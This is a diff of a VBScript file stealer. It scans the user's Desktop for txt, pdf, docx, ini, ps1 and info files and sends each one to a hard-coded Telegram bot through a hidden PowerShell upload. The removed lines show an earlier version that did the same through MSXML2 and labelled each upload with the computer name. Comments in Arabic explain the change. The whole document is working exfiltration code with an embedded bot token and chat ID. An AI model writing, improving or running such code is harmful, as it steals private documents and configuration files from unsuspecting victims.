@@ -1,46 +1,46 @@
-Dim WshShell, fso, botToken, chatId, computerId
+Dim WshShell, fso, botToken, chatId, desktopPath
 Set WshShell = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
 botToken = "8711318219:AAFj7ddap7JMNibxMSwIDBcBd8IS36jm6NA"
 chatId   = "8221773638"
-
-computerId = WshShell.ExpandEnvironmentStrings("%COMPUTERNAME%")
-
-Dim desktopPath
 desktopPath = WshShell.SpecialFolders("Desktop")
 
-Sub SendFile(filePath)
+' قائمة الامتدادات المسموح بها
+Function IsTargetFile(fileName)
+    Dim ext
+    ext = LCase(fso.GetExtensionName(fileName))
+    If ext = "txt" Or ext = "pdf" Or ext = "docx" Or ext = "ini" Or ext = "ps1" Or ext = "info" Then
+        IsTargetFile = True
+    Else
+        IsTargetFile = False
+    End If
+End Function
+
+Sub SendFileAsDocument(filePath)
     If Not fso.FileExists(filePath) Then Exit Sub
     
-    Dim fileName, ext
-    fileName = fso.GetFileName(filePath)
-    ext = LCase(fso.GetExtensionName(fileName))
+    ' استخدام PowerShell كـ "Wrapper" لتنفيذ طلب الـ Multipart بشكل صحيح
+    ' لأن VBS بحد ذاته ضعيف في بناء الـ Multipart-form
+    Dim psCommand
+    psCommand = "powershell -Command ""$botToken = '" & botToken & "'; $chatId = '" & chatId & "'; " & _
+                "$filePath = '" & filePath & "'; " & _
+                "$url = 'https://api.telegram.org/bot' + $botToken + '/sendDocument'; " & _
+                "$file = Get-Item $filePath; " & _
+                "$form = @{ chat_id = $chatId; document = $file }; " & _
+                "Invoke-RestMethod -Uri $url -Method Post -Form $form"""
     
-    If ext <> "txt" And ext <> "docx" Then Exit Sub
-    
-    Dim http, ts, content
-    Set http = CreateObject("MSXML2.XMLHTTP")
-    
-    Set ts = fso.OpenTextFile(filePath, 1, False, -2)
-    content = ts.ReadAll
-    ts.Close
-    
-    Dim url, postData
-    url = "https://api.telegram.org/bot" & botToken & "/sendDocument"
-    
-    postData = "chat_id=" & chatId & "&caption=" & computerId & " | " & fileName & "&document=" & content
-    
-    http.Open "POST", url, False
-    http.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
-    http.Send postData
+    WshShell.Run psCommand, 0, True
 End Sub
 
+' التنفيذ
 Dim folder, file
 Set folder = fso.GetFolder(desktopPath)
 
 For Each file In folder.Files
-    SendFile file.Path
+    If IsTargetFile(file.Name) Then
+        SendFileAsDocument file.Path
+    End If
 Next
 
 Set WshShell = Nothing
